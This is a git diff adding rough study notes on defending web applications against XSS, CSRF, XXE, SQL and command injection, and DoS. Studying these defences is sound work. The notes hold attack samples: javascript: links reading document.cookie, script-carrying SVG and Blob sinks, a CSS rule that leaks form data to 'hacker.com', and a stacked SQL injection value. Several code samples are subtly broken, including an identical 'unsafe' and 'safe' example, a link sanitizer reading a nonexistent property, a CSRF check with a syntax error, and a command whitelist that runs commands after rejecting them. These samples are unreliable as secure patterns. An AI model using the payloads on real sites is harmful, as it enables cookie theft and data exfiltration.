@@ -997,16 +997,461 @@ life cycle (SSDL)
 
 
 # Defending against XSS attacks 
+- we must ensure that the user-supplied data is interpreted as text and not DOM
+
+//unknown side effect of JSON.parse()
+const isStringLike = function(x) {
+  try {
+     return JSON.stringify(JSON.parse(x)) === x;
+  } catch (e) {
+    console.log('not string-like');
+  }
+};
+
+- innerText is much safer because it attempts to sanitize anything that looks like an HTML 
+
+const userString = '<strong>hello, world!</strong>;
+const div = document.querySelector('#userComment');
+div.innerText = userString; // tags interpreted as strings
+//div.innerHTML will interpreted as DOM
+
+- let’s assume your sanitizer blocks single and double quotes as well as script tags. You could still run into this issue
+
+<a href="javascript:alert(document.cookie)">click me</a>
+
+known as the JavaScript pseduo-scheme allow script execution without any script tags 
+
+<a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a>
+
+- Stay away from the following APIs when possible:
+
+element.innerHTM`L / `element.outerHTML
+
+Blob
+
+SVG
+
+document.write / document.writeln
+
+DOMParser.parseFromString
+
+document.implementation
+
+- dom parser sink 
+
+const parser = new DOMParser();
+const html = parser.parseFromString('<script>alert("hi");</script>`);
+
+- svg sink 
+
+SVG carry significant risk as sinks because they store arbitrary data and yet still are capable of code execution
+
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="250" cy="250" r="50" fill="red" />
+  <script type="text/javascript">console.log('test');</script>
+</svg>
+
+- Blob also carries the same risk
+
+// create blob with script reference
+const blob = new Blob([script], { type: 'text/javascript' });
+const url = URL.createObjectURL(blob);
+
+// inject script into page for execution
+const script = document.createElement('script');
+script.src = url;
+
+// load the script into the page
+document.body.appendChild(script);
+
+- sanitizing hyperlinks 
+
+<button onclick="goToLink()">click me</button>
+```
+const userLink = "<script>alert('hi')</script>";
+
+const goToLink = function() {
+  window.location.href = `https://mywebsite.com/${userLink}`;
+
+  // goes to: https://my-website.com/<script>alert('hi')</script>
+};
+```
+
+sanitized html
+```
+const userLink = "<script>alert('hi')</script>";
+
+const goToLink = function() {
+  const dummy = document.createElement('a');
+  dummy.href = userLink;
+  window.location.href = `https://mywebsite.com/${dummy.a}`;
+
+  // goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong
+};
+
+goToLink();
+
+encodeURIComponent('<strong>test</strong'); // %3Cstrong%3Etest%3C%2Fstrong%3E
+```
+
+- html entity encoding 
+&   & + amp;
+<   & + lt;
+>   & + gt;
+"   & + #034;
+'   & + #039;
+
+- CSS, <image></image> tags to initiate an HTTP GET request against a malicious web server?
+
+#income[value=">100k"] {
+  background:url("https://www.hacker.com/incomes?amount=gte100k");
+}
+
+when the income button is set to >100k, the CSS background changes, initiating a GET request and leaking the form data to another website
+
+CSS attacks can be avoided by:
+
+[easy]
+
+    Disallowing user-uploaded CSS
+[medium]
+
+    Allowing only specific fields to be modified by the user and generating the custom stylesheet yourself on the server using these fields
+[hard]
+
+    Sanitizing any HTTP-initiating CSS attributes (background:url)
+
+- script source 
+
+CSP allows you to specifically whitelist URLs from which dynamic scripts can be loaded. 
+
+Content-Security-Policy: script-src "self" https://api.mega-bank.com.
+
+The "self" in the CSP declaration simply refers to the current URL from which the policy is loaded
+
+- unsafe eval and unsafe inline 
+
+not good
+```
+const startCountDownTimer = function(minutes, message) {
+ setTimeout(function() {
+   alert(message);
+ }, minutes * 60 * 1000);
+};
+```
+
+a safe way 
+```
+const startCountDownTimer = function(minutes, message) {
+ setTimeout(function() {
+   alert(message);
+ }, minutes * 60 * 1000);
+};
+```
+
+- implementing a CSP 
+
+CSP is easy to implement as it is simply a string configuration modifier that is read by the browser and translated into security rules
+
+Have your server send a Content-Security-Policy header with each request. 
+
+Embed a <meta> tag in your HTML markup.
+
+
 
 # Defending against CSRF attacks 
+- Cross-Site Request Forgery (CSRF) attacks that took advantage of a user’s authenticated session in order to make requests on their behalf. 
+
+HTTP, there are two headers we are interested in when checking the origin of a request: referer and origin. cannot be modified programmatically with JavaScript in all major browsers
+
+The origin header is only sent on HTTP POST requests. It is a simple header that indicates where a request originated from
+
+The referer header is set on all requests, and also indicates where a request originated from. 
+
+- only sent on HTTP POST requests, An origin header looks like: Origin: https://www.mega-bank.com:80
+
+- The referer header is set on all requests, and also indicates where a request originated from
+
+Referer: https://www.mega-bank.com:80
+
+- a POST request is made to your web server—for example, https://www.mega-bank.com/transfer with params amount=1000 and to_user=123—you can verify that the location of these headers is the same as your trusted origins
+
+- CSRF tokens
+
+client makes request for web page 
+|
+V
+server returns web page along with CSRF token 
+|
+V
+client requests http resource on server, attaching CSRF token 
+|
+V 
+CSRF token is validated by server and response is sent to client
+
+This token is generated cryptographically with a very low collision algorithm, which means that the odds of getting two identical tokens are exceedingly rare
+
+- stateless CSRF tokens CSRF token should consist of the following:
+
+A unique identifier of the user the token belongs to
+
+A timestamp (which can be used for expiration)
+
+A cryptographic nonce whose key only exists on the server
+
+- Anti-CRSF Coding Best Practices
+
+refactoring to stateless GET requests 
+
+implementation of application wide CSRF defense 
+
+introduction of request-checking middleware 
+
+- stateless GET request 
+
+// GET
+const user = function(req, res) {
+ getUserById(req.query.id).then((user) => {
+   if (req.query.updates) { user.update(req.updates); }
+   return res.json(user);
+ });
+};
+
+// POST
+const updateUser = function(req, res) {
+  getUserById(req.query.id).then((user) => {
+   user.update(req.updates).then((updated) => {
+     if (!updated) { return res.sendStatus(400); }
+     return res.sendStatus(200);
+   });
+ });
+};
+
+- application wide CSRF mitigation 
+
+```
+const crypto = require('../util/crypto');
+const dateTime = require('../util/dateTime');
+const session = require('../util/session');
+const logger = require('../util/logger');
+
+const validLocations = [
+ 'https://www.mega-bank.com',
+ 'https://api.mega-bank.com',
+ 'https://portal.mega-bank.com'
+ ];
+
+const validateHeaders = function(headers, method) {
+  const origin = headers.origin;
+  const referer = headers.referer;
+  let isValid = false;
+
+  if (method === 'POST') {
+    isValid = validLocations.includes(referer) && validLocations.includes(origin);
+  } else {
+    isValid = validLocations.includes(referer);
+  }
+
+  return isValid;
+};
+
+const validateCSRFToken = function(token, user) {
+  // get data from CSRF token
+  const text_token = crypto.decrypt(token);
+  const user_id = text_token.split(':')[0];
+  const date = text_token.split(':')[1];
+  const nonce = text_token.split(':')[2];
+
+  // check validity of data
+  let validUser = false;
+  let validDate = false;
+  let validNonce = false;
+
+  if (user_id === user.id) { validUser = true; }
+  if (dateTime.lessThan(1, 'week', date)) { validDate = true; }
+  if (crypto.validateNonce(user_id, date, nonce)) { validNonce = true; }
+
+  return validUser && validDate && validNonce;
+};
+
+const CSRFShield = function(req, res, next) {
+ if (!validateHeaders(req.headers, req.method) ||
+     !validateCSRFToken(req.csrf, session.currentUser) {
+     logger.log(req);
+     return res.sendStatus(401);
+  }
+
+ return next();
+};
+```
+
 
 # Defending against XXE 
+- XXE is indeed easy to defend against—simply disable external entities in your XML parser (see Figure 24-1).
+
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+particularly dangerous against Java-based XML parsers
+
+always check your XML parser’s API documentation to make sure
+
+- evaluating other data formats, change xml to JSON 
+
+XML is probably still ideal in any case where the payload will eventually be rendered.
+
+JSON, YAML, BSON, or EDN are all suitable alternatives but should require a similar analysis prior to commitment.
+
+
 
 # Defending against inject 
+- SQL injection 
+
+/api
+  /routes
+  /utils
+/analytics
+  /routes
+/client
+  /pages
+  /scripts
+  /media
+  
+- Node.js app and contains:
+
+    SQL Server—via NodeMSSQL adapter (npm)
+
+    MySQL—via mysql adapter (npm)
+
+```
+const sql = require('sql');
+
+const getUserByUsername = function(username) {
+  const q = new sql();
+  q.select('*');
+  q.from('users');
+  q.where(`username = ${username}`);
+  q.then((res) => {
+    return `username is : ${res}`;
+  });
+};
+```
+
+- prepared statements, it set in stone prior to the user-submitted data being presentted into SQL. the query cannot change 
+
+SQL injection risk and are supported by almost every major SQL database: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, etc.
+
+    + mysql 
+```
+PREPARE q FROM 'SELECT name, barCode from products WHERE price <= ?';
+SET @price = 12;
+EXECUTE q USING @price;
+DEALLOCATE PREPARE q;
+```
+prepared statement, q is compiled prior to being executed with @price. Even if @price was set equal to 5; UPDATE users WHERE id = 123 SET balance = 10000, the additional query would not fire as it would not be compiled by the database.
+
+- database specific defense, QUOTE function in MySQL will escape backslashes, single quotes, or NULL
+
+- whitelisting commands 
+
+```
+const cli = require('../util/cli');
+
+const commands = [
+ 'print',
+ 'cut',
+ 'copy',
+ 'paste',
+ 'refresh'
+];
+
+/*
+ * Accepts commands from the client, runs them against the CLI ONLY if
+ * they appear in the whitelist array.
+ */
+const postCommands = function(req, res) {
+  const userCommands = req.body.commands;
+  userCommands.forEach((c) => {
+    if (!commands.includes(c)) { return res.sendStatus(400); }
+  });
+  cli.run(req.body.commands);
+};
+```
+
 
 # Defending against DoS 
+- DoS attacks are structured with one or more of the following results in mind 
 
-# Conclusion 
+Exhaust server resources 
+
+Exhaust client resources 
+
+Request unavailable resource 
+
+- Regex DoS attacks are likely the easiest form of DoS to defend against
+
+a form similar to (a[ab]*)+, where the + suggests to perform a greedy match
+ 
+- Logical DoS is much more difficult to detect and prevent than regex DoS.
+
+- portecting against ddos 
+
+Distributed denial of service attacks (DDoS) are much more difficult to defend against than DoS attacks that originate from a single attacker. While single-target DoS attacks often target a bug in application code (like an improperly written regex, or a resource-hogging API call)
+
+- DDoS attacks usually do not target logic bugs, but instead attempt to overwhelm the target by sheer volume of legitimate-looking traffic
+
+- DDoS Mitigation 
+
+    + The easiest way to defend your web application against a DDoS attack is to invest in a bandwidth management service. 
+
+    + web application architecture to mitigate DDoS risk. One common technique is known as blackholing, whereby you set up a number of servers in addition to a main application server
+
+
+
+# Securing thrid-party dependencies 
+-  dependency tree often looks like the following:Primary Application v1.6 → JQuery 3.4.0Primary Application v1.6 → SPA Framework v1.3.2 → JQuery v2.2.1Primary Application v1.6 → UI Component Library v4.5.0 → JQuery v2.2.1
+
+$ npm list --depth=[depth].
+
+- secure package management 
+
+npm will include a caret (^) prior to any dependency by default. If you remove this caret, the dependency will use the exact version rather than the latest patch
+
+
+- shrinkwrapping comes into play. Running the command npm shrinkwrap against an npm repo will generate a new file called npm-shrinkwrap.json
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
